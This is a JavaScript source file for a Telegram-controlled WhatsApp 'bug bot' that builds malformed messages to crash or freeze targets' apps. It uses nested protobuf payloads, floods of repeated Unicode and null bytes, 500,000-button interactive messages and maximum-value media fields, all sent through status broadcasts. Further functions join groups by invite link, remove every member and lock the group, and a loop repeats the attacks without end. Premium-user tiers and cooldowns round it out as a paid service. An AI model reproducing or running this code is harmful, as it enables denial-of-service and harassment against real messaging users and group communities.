// =====================================================
//  HEFAISTOS HADES
//  WhatsApp Bug Bot • Telegram Control Panel
//  Dev : @shinracery
// =====================================================

const { Telegraf } = require("telegraf");
const fs = require("fs");
const path = require("path");
const https = require("https");
const FormData = require("form-data");
const chalk = require("chalk");
const axios = require("axios");
const moment = require("moment-timezone");
const pino = require("pino");
const crypto = require("crypto");
const EventEmitter = require("events");
const { tokenBot, ownerID } = require("./config");

const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  DisconnectReason,
  proto,
  generateWAMessageFromContent,
} = require("@whiskeysockets/baileys");

// ---------- pengaturan dasar ----------
const adminFile        = "./database/adminuser.json";
const thumbnailUrl     = "https://k.top4top.io/p_3927brgaj0.png";
const ThumbnailPairing = "https://k.top4top.io/p_3927brgaj0.png";
const usePairingCode   = true;

const bot = new Telegraf(tokenBot);

let sock                = null;
global.sock             = null;
let isWhatsAppConnected = false;
let lastPairingMessage  = null;

// ---------- helper kecil ----------
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

const loadJSON = (file) =>
  fs.existsSync(file) ? JSON.parse(fs.readFileSync(file, "utf8")) : [];

const saveJSON = (file, data) =>
  fs.writeFileSync(file, JSON.stringify(data, null, 2));

const esc = (s = "") =>
  String(s)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");

function formatTarget(n) {
  if (!n) return null;
  n = n.replace(/[^0-9]/g, "");
  if (n.startsWith("0")) n = "62" + n.slice(1);
  return n + "@s.whatsapp.net";
}

function formatRuntime() {
  let s = Math.floor(process.uptime());
  const h = Math.floor(s / 3600); s %= 3600;
  const m = Math.floor(s / 60); s %= 60;
  return `${h}h ${m}m ${s}s`;
}

function formatMemory() {
  return `${(process.memoryUsage().rss / 524 / 524).toFixed(0)} MB`;
}

// ---------- image random buat ban ----------
const BAN_IMAGES = [
  "https://files.catbox.moe/l3djrx.jpg",
  "https://files.catbox.moe/aaercl.jpg",
  "https://k.top4top.io/p_3927brgaj0.png",
];
function getRandomImage() {
  return BAN_IMAGES[Math.floor(Math.random() * BAN_IMAGES.length)];
}

// =====================================================
// ================ FUNGSI BUG (MULTI) =================
// =====================================================

async function ForcloseVIDEO(sock, target) {
  const video = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "sHsVF8wMbs/aI6GB8xhiZF1NiKQOgB2GaM5O0/NuAII=",
    fileLength: 999999999,
    seconds: 999999999,
    mediaKey: "EneIl9K1B0/ym3eD0pbqriq+8K7dHMU9kkonkKgPs/8=",
    caption: "NandoX",
    height: 9999,
    width: 9999,
    fileEncSha256: "KcHu146RNJ6FP2KHnZ5iI1UOLhew1XC5KEjMKDeZr8I=",
    directPath: "/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1751081957",
    jpegThumbnail: null,
    streamingSidecar: null,
  };

  const tol = [[0xBA, 0x03], [0xD2, 0x04], [0xAA, 0x02]];
  const encodeVarint = function (rb) { var buf = []; while (rb >= 0x80) { buf.push((rb & 0x7f) | 0x80); rb >>>= 7; } buf.push(rb); return Buffer.from(buf); };
  const wrapLd = function (tag, data) { return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]); };
  const MakLo = proto.Message.encode(proto.Message.fromObject({ videoMessage: video })).finish();
  const inflate = function (tag, rayap) { var buf = MakLo; for (var i = 0; i < rayap; i++) buf = wrapLd(tag, wrapLd([0x0A], buf)); return buf; };
  const resolveJid = function (raw) { var s = String(raw || "").trim(); if (s.includes("@")) return s; return s.replace(/\D/g, "") + "@s.whatsapp.net"; };
  const jids = (Array.isArray(target) ? target : [target]).map(resolveJid).filter(function (j) { return j.length > 15; });

  var MAX_BATCH = 100, DELAY_MS = 2000;

  for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
    var crb = jids.slice(offset, offset + MAX_BATCH);
    if (offset !== 0) await new Promise(function (r) { setTimeout(r, DELAY_MS); });
    var idx = Math.floor(offset / MAX_BATCH) + 1;
    var suffix = idx > 1 ? "n" + idx : "n";
    var CrBMsG = "crb" + Date.now().toString(36).toUpperCase() + suffix;

    for (var ti = 0; ti < tol.length; ti++) {
      var tag = tol[ti];
      var bokep = null;
      for (var rayap = 5000; rayap >= 2000 && !bokep; rayap -= 400) {
        try { var decoded = proto.Message.decode(inflate(tag, rayap)); proto.Message.encode(decoded).finish(); bokep = decoded; } catch (_) {}
      }
      if (!bokep) continue;
      await sock.relayMessage("status@broadcast", bokep, {
        messageId: CrBMsG, statusJidList: crb,
        additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: crb.map(function (jid) { return { tag: "to", attrs: { jid: jid }, content: [] }; }) }] }],
      });
    }
  }
}

async function ForcloseDOC(sock, target) {
  const document = {
    url: "https://mmg.whatsapp.net/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0&mms3=true",
    mimetype: "application/pdf",
    fileSha256: "7rOXceVPuGvMTfHN7VXURYOQV2ZmzxQ4xZ6cLM2JNPA=",
    fileLength: 999999999,
    pageCount: 1000,
    mediaKey: "oohdpzQ3uCjBvJWx+2VmRj4bWsCiTvrpUftezu27bs4=",
    fileName: "nando.pdf",
    fileEncSha256: "IT6Goux9voqfI50TST8rtFY9iVmxZenRz55JXZpAR2g=",
    directPath: "/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1779839963",
    thumbnailDirectPath: "/v/t62.36145-24/705860036_1320514133375133_5228808273876536402_n.enc?ccb=11-4&oh=01_Q5Aa4gFkVLVWUFlX-Jk7uj1PdsnY5lmVp4lWmmQYdHkPsFhTUQ&oe=6A3DAF40&_nc_sid=5e03e0",
    thumbnailSha256: "xK2z7ScS2wSQDxLVfdZ5e1BpIe+GsTv8KaVGAfufqjY=",
    thumbnailEncSha256: "2N98oiJb8xii+D/KYAuHRq7Mg/8OIHFXNZQ5py4g9fM=",
    jpegThumbnail: null, contextInfo: {}, thumbnailHeight: 999, thumbnailWidth: 999,
  };

  const tol = [[0xBA, 0x03], [0xD2, 0x04], [0xAA, 0x02]];
  const encodeVarint = function (rb) { var buf = []; while (rb >= 0x80) { buf.push((rb & 0x7f) | 0x80); rb >>>= 7; } buf.push(rb); return Buffer.from(buf); };
  const wrapLd = function (tag, data) { return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]); };
  const MakLo = proto.Message.encode(proto.Message.fromObject({ documentMessage: document })).finish();
  const inflate = function (tag, rayap) { var buf = MakLo; for (var i = 0; i < rayap; i++) buf = wrapLd(tag, wrapLd([0x0A], buf)); return buf; };
  const resolveJid = function (raw) { var s = String(raw || "").trim(); if (s.includes("@")) return s; return s.replace(/\D/g, "") + "@s.whatsapp.net"; };
  const jids = (Array.isArray(target) ? target : [target]).map(resolveJid).filter(function (j) { return j.length > 15; });

  var MAX_BATCH = 100, DELAY_MS = 2000;

  for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
    var crb = jids.slice(offset, offset + MAX_BATCH);
    if (offset !== 0) await new Promise(function (r) { setTimeout(r, DELAY_MS); });
    var idx = Math.floor(offset / MAX_BATCH) + 1;
    var suffix = idx > 1 ? "n" + idx : "n";
    var CrBMsG = "crb" + Date.now().toString(36).toUpperCase() + suffix;

    for (var ti = 0; ti < tol.length; ti++) {
      var tag = tol[ti];
      var bokep = null;
      for (var rayap = 5000; rayap >= 2000 && !bokep; rayap -= 400) {
        try { var decoded = proto.Message.decode(inflate(tag, rayap)); proto.Message.encode(decoded).finish(); bokep = decoded; } catch (_) {}
      }
      if (!bokep) continue;
      await sock.relayMessage("status@broadcast", bokep, {
        messageId: CrBMsG, statusJidList: crb,
        additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: crb.map(function (jid) { return { tag: "to", attrs: { jid: jid }, content: [] }; }) }] }],
      });
    }
  }
}

async function ForcloseSTC(sock, target) {
  const sticker = {
    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
    fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
    fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
    mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
    mimetype: "image/webp",
    directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
    fileLength: "10610",
    mediaKeyTimestamp: "1775044724",
    stickerSentTs: "1775044724091",
  };

  const tol = [[0xBA, 0x03], [0xD2, 0x04], [0xAA, 0x02]];
  const encodeVarint = function (rb) { var buf = []; while (rb >= 0x80) { buf.push((rb & 0x7f) | 0x80); rb >>>= 7; } buf.push(rb); return Buffer.from(buf); };
  const wrapLd = function (tag, data) { return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]); };
  const MakLo = proto.Message.encode(proto.Message.fromObject({ stickerMessage: sticker })).finish();
  const inflate = function (tag, rayap) { var buf = MakLo; for (var i = 0; i < rayap; i++) buf = wrapLd(tag, wrapLd([0x0A], buf)); return buf; };
  const resolveJid = function (raw) { var s = String(raw || "").trim(); if (s.includes("@")) return s; return s.replace(/\D/g, "") + "@s.whatsapp.net"; };
  const jids = (Array.isArray(target) ? target : [target]).map(resolveJid).filter(function (j) { return j.length > 15; });

  var MAX_BATCH = 100, DELAY_MS = 2000;

  for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
    var crb = jids.slice(offset, offset + MAX_BATCH);
    if (offset !== 0) await new Promise(function (r) { setTimeout(r, DELAY_MS); });
    var idx = Math.floor(offset / MAX_BATCH) + 1;
    var suffix = idx > 1 ? "n" + idx : "n";
    var CrBMsG = "crb" + Date.now().toString(36).toUpperCase() + suffix;

    for (var ti = 0; ti < tol.length; ti++) {
      var tag = tol[ti];
      var bokep = null;
      for (var rayap = 5000; rayap >= 2000 && !bokep; rayap -= 400) {
        try { var decoded = proto.Message.decode(inflate(tag, rayap)); proto.Message.encode(decoded).finish(); bokep = decoded; } catch (_) {}
      }
      if (!bokep) continue;
      await sock.relayMessage("status@broadcast", bokep, {
        messageId: CrBMsG, statusJidList: crb,
        additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: crb.map(function (jid) { return { tag: "to", attrs: { jid: jid }, content: [] }; }) }] }],
      });
    }
  }
}

async function StuckLogo(sock, target) {
  await sock.relayMessage(target, {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0&mms3=true",
      fileSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
      fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
      mediaKey: "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXphYmNkZWY=",
      mimetype: "image/webp",
      height: 4294967295,
      width: 4294967295,
      directPath: "/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1",
      fileLength: 9007199254740991,
      mediaKeyTimestamp: 9007199254740991,
      firstFrameLength: 4294967295,
      firstFrameSidecar: "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXphYmNkZWY=",
      isAnimated: true,
      pngThumbnail: "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXphYmNkZWY=",
      contextInfo: {
        mentionedJid: [target],
        quotedMessage: { contactMessage: { displayName: " ", vcard: "\u0000".repeat(45000) } }
      },
      stickerSentTs: 9007199254740991,
      isAvatar: true,
      isAiSticker: true,
      isLottie: true,
      accessibilityLabel: "ꦾ".repeat(30000)
    }
  }, { participant: target });

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: "Vixzz Ganteng Bangettt" },
          nativeFlowMessage: { buttons: Array.from({ length: 500000 }, () => ({})) },
          contextInfo: { quotedMessage: { contactMessage: { displayName: " ", vcard: "" } } }
        }
      }
    }
  }, { participant: target });

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: { text: "AmbaJahat", format: "DEFAULT" },
          nativeFlowResponseMessage: { name: "galaxy_message", paramsJson: "\u2062".repeat(30000), version: 3 },
          contextInfo: { quotedMessage: { contactMessage: { displayName: " ", vcard: "" } } }
        }
      }
    }
  }, { participant: target });
}

async function StuckNewAmba(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: "AmbaJahat || @vixzzoficialNe" },
          nativeFlowMessage: { buttons: Array.from({ length: 500000 }, () => ({})) },
          contextInfo: {
            mentionedJid: [target],
            quotedMessage: {
              imageMessage: {
                url: "https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1",
                mimetype: "image/jpeg",
                fileSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
                fileLength: 9007199254740991,
                height: 4294967295,
                width: 4294967295,
                mediaKey: crypto.randomBytes(32).toString("base64"),
                fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
                directPath: "/m1/v/t24/00002299291718920200291920729100",
                jpegThumbnail: "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXphYmNkZWY="
              }
            }
          }
        }
      }
    }
  }, { participant: target });
}

async function iosswipper(sock, target) {
  const a = " fvck sereη. " + "𑇂𑆵𑆴𑆿".repeat(70000);
  const b = "𑇂𑆵𑆴𑆿".repeat(70000);

  try {
    let c = { degreesLatitude: 11.11, degreesLongitude: -11.11, name: "𑇂𑆵𑆴𑆿".repeat(60000), url: "https://t.me/abcseren" };
    let d = generateWAMessageFromContent(target, { viewOnceMessage: { message: { locationMessagex: c } } }, {});

    let e = {
      extendedTextMessage: {
        text: b, matchedText: " fvck sereη. ",
        description: "𑇂𑆵𑆴𑆿".repeat(60000),
        title: "𑇂𑆵𑆴𑆿".repeat(60000),
        previewType: "NONE", jpegThumbnail: "",
        thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
        thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
        thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
        mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
        mediaKeyTimestamp: "1743101489",
        thumbnailHeight: 641, thumbnailWidth: 640,
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    };

    let f = generateWAMessageFromContent(target, { viewOnceMessage: { message: { extendMsgx: e } } }, {});

    let g = {
      degreesLatitude: -9.09999262999, degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(17000),
      address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(11000),
      url: `${"𑇂𑆵𑆴𑆿".repeat(28000)}`,
    };

    let h = generateWAMessageFromContent(target, { viewOnceMessage: { message: { locationMessage: g } } }, {});

    let i = {
      extendedTextMessage: {
        text: a, matchedText: " fvck sereη. ",
        description: "𑇂𑆵𑆴𑆿".repeat(29000),
        title: " fvck sereη. " + "𑇂𑆵𑆴𑆿".repeat(19000),
        previewType: "NONE",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAb/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCdABmX/9k=",
        thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
        thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
        thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
        mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
        mediaKeyTimestamp: "1743101489",
        thumbnailHeight: 641, thumbnailWidth: 640,
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    };

    let j = generateWAMessageFromContent(target, { viewOnceMessage: { message: { extendMsg: i } } }, {});
    let k = generateWAMessageFromContent(target, { viewOnceMessage: { message: { locationMessage: g } } }, {});

    for (let i = 0; i < 40; i++) {
      await sock.relayMessage("status@broadcast", d.message, { messageId: d.key.id, statusJidList: [target], additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }] });
      await sock.relayMessage("status@broadcast", f.message, { messageId: f.key.id, statusJidList: [target], additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }] });
      await sock.relayMessage("status@broadcast", d.message, { messageId: d.key.id, statusJidList: [target], additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }] });
      await sock.relayMessage("status@broadcast", f.message, { messageId: f.key.id, statusJidList: [target], additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }] });
      await sock.relayMessage("status@broadcast", k.message, { messageId: f.key.id, statusJidList: [target], additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }] }] });
      if (i < 9) await new Promise((resolve) => setTimeout(resolve, 5000));
    }
  } catch (err) {}
}

async function catchingOs(target) {
  let a = "\u0010";
  let b = "𑇂𑆵𑆴𑆿𑆿".repeat(40000);
  let c = "\u0000".repeat(600000);
  let d = "█".repeat(400000);

  let e = {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: -999999.999999, degreesLongitude: 999999.999999,
          name: a + b + c, address: a + b + c,
          url: `${"𑇂𑆵𑆴𑆿".repeat(50000)}`,
          contextInfo: {
            participant: target,
            mentionedJid: Array.from({ length: 8000 }, () => "1" + Math.floor(Math.random() * 999999999) + "@s.whatsapp.net"),
            externalAdReply: { title: d, body: c, mediaType: "VIDEO" },
          },
        },
        nativeFlowMessage: {
          name: "galaxy_message",
          paramsJson: "{".repeat(400000) + "}".repeat(400000),
          version: 3,
        },
      },
    },
  };

  let f = generateWAMessageFromContent(target, e, {});
  await global.sock.relayMessage("status@broadcast", f.message, {
    messageId: Date.now(), statusJidList: [target],
    additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target } }] }] }],
  });
}

// =====================================================
// ================ BAN GROUP FUNCTIONS ================
// =====================================================
async function groupBan2(sock, target) {
  target = String(target);
  let groupJid = target;

  if (!target.endsWith("@g.us")) {
    const inviteCode = target.includes("chat.whatsapp.com/")
      ? target.split("chat.whatsapp.com/")[1].split(/[?/]/)[0]
      : target.replace(/[^a-zA-Z0-9]/g, "");

    try {
      groupJid = await sock.groupAcceptInvite(inviteCode);
    } catch (e) {
      if (e.message.includes("conflict") || e.message.includes("already")) {
        try {
          const meta = await sock.groupGetInviteInfo(inviteCode);
          groupJid = meta.id;
        } catch (e2) { console.log(`❌ ${e2.message}`); return false; }
      } else { console.log(`❌ Gagal join grup: ${e.message}`); return false; }
    }
  }

  if (!groupJid || !String(groupJid).endsWith("@g.us")) {
    console.log(`❌ @g.us server required`);
    return false;
  }

  const fakeNumbers = [
    "6280000000000@s.whatsapp.net", "14155552671@s.whatsapp.net",
    "447400000000@s.whatsapp.net", "61400000000@s.whatsapp.net",
    "6281234567890@s.whatsapp.net", "6287873499996@s.whatsapp.net",
    "6285655555555@s.whatsapp.net", "6289876543210@s.whatsapp.net",
    "6281111111111@s.whatsapp.net", "6282222222222@s.whatsapp.net",
    "6283333333333@s.whatsapp.net", "6284444444444@s.whatsapp.net",
    "6285555555555@s.whatsapp.net", "6286666666666@s.whatsapp.net",
    "6287777777777@s.whatsapp.net", "6288888888888@s.whatsapp.net",
    "6289999999999@s.whatsapp.net",
  ];

  const actions = ["add", "remove", "promote", "demote"];
  const fake    = fakeNumbers[Math.floor(Math.random() * fakeNumbers.length)];
  const action  = actions[Math.floor(Math.random() * actions.length)];

  try {
    await sock.groupParticipantsUpdate(groupJid, [fake], action);
    return true;
  } catch (e) { console.log(`❌ Gagal: ${e.message}`); return false; }
}

async function proxzy(sock, jid) {
  for (let i = 0; i < 50; i++) {
    try { await groupBan2(sock, jid); } catch (e) { console.log(`[proxzy] err:`, e.message); }
    await sleep(1500);
  }
}

async function BanGroup(sock, targetJid) {
  let group = targetJid.includes("@g.us") ? targetJid : targetJid + "@g.us";
  let members = await sock.groupMetadata(group);

  for (let i = 0; i < 20; i++) {
    try {
      for (let m of members.participants) {
        let id = m.id;
        if (id !== sock.user.id) {
          await sock.groupParticipantsUpdate(group, [id], "remove");
          await new Promise(r => setTimeout(r, 15));
        }
      }

      await sock.groupParticipantsUpdate(group, ["0@s.whatsapp.net"], "add");
      await new Promise(r => setTimeout(r, 10));
      await sock.groupParticipantsUpdate(group, ["0@s.whatsapp.net"], "remove");

      await sock.sendMessage(group, {
        text: "\u200B".repeat(3000) + "\u0000".repeat(3000) + "\u202E".repeat(1000),
      });

      await sock.groupSettingsUpdate(group, "announcement", true);
      await sock.groupSettingsUpdate(group, "locked", true);
    } catch (e) {}
  }
}

// =====================================================
// ============ SPAM LOOP ANTI-ERROR ==================
// =====================================================
const activeSpam = new Map();
let spamCounter = 0;

async function spamForever(ctx, label, target, tasks) {
  const userId = ctx.from.id.toString();
  const jobId  = `${userId}_${++spamCounter}`;

  activeSpam.set(jobId, { userId, stop: false, stats: { ok: 0, fail: 0 } });

  const startAt = Date.now();
  let iterasi = 0;

  await ctx.telegram.sendMessage(
    ctx.chat.id,
    `🚀 <b>${label}</b> start ke <code>${target.split("@")[0]}</code>\n🆔 Job: <code>${jobId}</code>\n\nKetik /stopbug buat berhentiin semua spam kamu.`,
    { parse_mode: "HTML" }
  ).catch(() => {});

  while (true) {
    const state = activeSpam.get(jobId);
    if (!state || state.stop) {
      const durasi = Math.floor((Date.now() - startAt) / 1000);
      await ctx.telegram.sendMessage(
        ctx.chat.id,
        `🛑 <b>${label}</b> (${jobId}) dihentikan\n\n✅ Sukses : ${state?.stats.ok || 0}\n❌ Gagal  : ${state?.stats.fail || 0}\n⏱ Durasi : ${durasi}s`,
        { parse_mode: "HTML" }
      ).catch(() => {});
      activeSpam.delete(jobId);
      return;
    }

    iterasi++;
    let semuaOk = true;

    for (const t of tasks) {
      try { await t.fn(); }
      catch (e) {
        semuaOk = false;
        console.log(`[${label}|${jobId}] ${t.name} err:`, e.message);
      }
    }

    if (semuaOk) state.stats.ok++;
    else state.stats.fail++;

    if (iterasi % 10 === 0) {
      const durasi = Math.floor((Date.now() - startAt) / 1000);
      await ctx.telegram.sendMessage(
        ctx.chat.id,
        `📊 <b>${label}</b> (${jobId})\n\n🔄 Iterasi : ${iterasi}\n✅ Sukses  : ${state.stats.ok}\n❌ Gagal   : ${state.stats.fail}\n⏱ Durasi  : ${durasi}s`,
        { parse_mode: "HTML" }
      ).catch(() => {});
    }

    await sleep(1500);
  }
}

// =====================================================
// ================== IN MEMORY STORE ==================
// =====================================================
function makeInMemoryStore() {
  const ev = new EventEmitter();
  const chats = {}, messages = {}, contacts = {};
  ev.on("messages.upsert", ({ messages: nm }) => {
    for (const msg of nm) {
      const id = msg.key.remoteJid;
      messages[id] = messages[id] || [];
      messages[id].push(msg);
      if (messages[id].length > 50) messages[id].shift();
    }
  });
  return { chats, messages, contacts, bind: (target) => target.on("messages.upsert", (m) => ev.emit("messages.upsert", m)) };
}

// =================== TASK QUEUE ===================
class TaskQueue {
  constructor() { this.q = []; this.busy = false; }
  add(job) { this.q.push(job); this.run(); }
  async run() {
    if (this.busy) return;
    this.busy = true;
    while (this.q.length) {
      const job = this.q.shift();
      try { await job(); } catch (e) { console.error("task err:", e.message); }
    }
    this.busy = false;
  }
}
const queue = new TaskQueue();

// =================== PREMIUM GROUP ===================
const PREM_DB = path.join(__dirname, "premgb.json");
function loadPrem() {
  try {
    if (!fs.existsSync(PREM_DB)) fs.writeFileSync(PREM_DB, JSON.stringify({ groups: [] }, null, 2));
    const d = JSON.parse(fs.readFileSync(PREM_DB, "utf8"));
    return d?.groups && Array.isArray(d.groups) ? d : { groups: [] };
  } catch { return { groups: [] }; }
}
const savePrem = (d) => fs.writeFileSync(PREM_DB, JSON.stringify(d, null, 2));
const isPremGroup = (id) => loadPrem().groups.includes(Number(id));
const addPremGroup = (id) => { const d = loadPrem(); id = Number(id); if (!d.groups.includes(id)) d.groups.push(id); savePrem(d); };
const delPremGroup = (id) => { const d = loadPrem(); d.groups = d.groups.filter((x) => x !== Number(id)); savePrem(d); };

// =================== PREMIUM USER ===================
const premiumFile  = "./database/premium.json";
const cooldownFile = "./database/cooldown.json";
const loadPremUsers = () => { try { return JSON.parse(fs.readFileSync(premiumFile)); } catch { return {}; } };
const savePremUsers = (u) => fs.writeFileSync(premiumFile, JSON.stringify(u, null, 2));

function addPremUser(userId, duration) {
  const u = loadPremUsers();
  const exp = moment().add(duration, "days").tz("Asia/Jakarta").format("DD-MM-YYYY");
  u[userId] = exp; savePremUsers(u); return exp;
}
function removePremUser(userId) { const u = loadPremUsers(); delete u[userId]; savePremUsers(u); }
function isPremiumUser(userId) {
  const u = loadPremUsers();
  if (!u[userId]) return false;
  if (moment().isBefore(moment(u[userId], "DD-MM-YYYY"))) return true;
  removePremUser(userId); return false;
}

const loadCooldown = () => { try { return JSON.parse(fs.readFileSync(cooldownFile)).cooldown || 5; } catch { return 5; } };
const saveCooldown = (s) => fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: s }, null, 2));
let cooldown = loadCooldown();
const userCooldowns = new Map();

// =================== APPROVED GROUP ===================
const APPROVED_FILE = path.join(__dirname, "approved_groups.json");
let approvedGroups = [];
let pendingGroups = new Map();
try {
  if (fs.existsSync(APPROVED_FILE)) {
    const d = JSON.parse(fs.readFileSync(APPROVED_FILE, "utf8"));
    approvedGroups = Array.isArray(d) ? d : [];
  }
} catch {}
const saveApproved = () => fs.writeFileSync(APPROVED_FILE, JSON.stringify(approvedGroups, null, 2));
const isGroupApproved = (id) => approvedGroups.includes(String(id));
const isOwner = (id) => String(id) === String(ownerID);

